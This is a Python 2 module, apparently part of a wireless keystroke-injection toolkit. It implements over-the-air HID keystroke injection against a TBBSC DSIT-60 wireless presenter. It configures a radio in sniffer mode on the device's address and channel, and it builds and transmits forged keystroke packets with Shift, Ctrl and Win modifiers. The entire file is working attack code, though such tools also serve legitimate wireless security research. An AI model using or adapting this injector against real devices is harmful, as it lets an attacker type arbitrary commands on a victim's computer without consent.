from .protocol import Protocol
from lib import common
from collections import deque
from threading import Thread
import time
import logging
import crcmod
import struct


# TBBSC DSIT-60 wireless presenter
class TBBSC(Protocol):

  # Constructor
  def __init__(self, address):

    self.address = address

    super(TBBSC, self).__init__("TBBSC")


  # Configure the radio
  def configure_radio(self):

    # Put the radio in sniffer mode
    common.radio.enter_sniffer_mode(self.address, rate=common.RF_RATE_250K)

    # Set the channels to [6]
    common.channels = [6]

    # Set the initial channel
    common.radio.set_channel(common.channels[0])

    # Initial sequence number
    self.seq = 0


  def send_hid_event(self, scan_code=0, shift=False, ctrl=False, win=False):

    # Keystroke modifiers
    modifiers = 0x00
    if shift: modifiers |= 0x20
    if ctrl: modifiers |= 0x01
    if win: modifiers |= 0x08

    # Build and transmit the payload
    payload = ("%02x:42:%02x:%02x" % (self.seq&0x0f, modifiers, scan_code)).replace(":", "").decode("hex")
    for x in range(2):
      ack_timeout = 1 # 500ms
      retries = 4
      common.radio.transmit_payload(payload, ack_timeout, retries)
    self.seq += 1


  # Enter injection mode
  def start_injection(self):
    return


  # Leave injection mode
  def stop_injection(self):
    return
